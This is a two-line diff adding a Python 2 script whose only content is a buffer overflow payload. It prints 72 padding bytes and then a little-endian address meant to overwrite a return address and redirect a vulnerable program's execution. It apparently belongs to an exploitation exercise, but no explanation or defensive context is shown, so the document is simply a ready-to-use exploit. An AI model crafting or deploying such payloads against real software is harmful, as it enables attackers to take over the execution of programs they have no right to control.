@@ -1,0 +1,2 @@
+#!python
+print 'X' * 72 + '\x8d\x05\x00\x00'
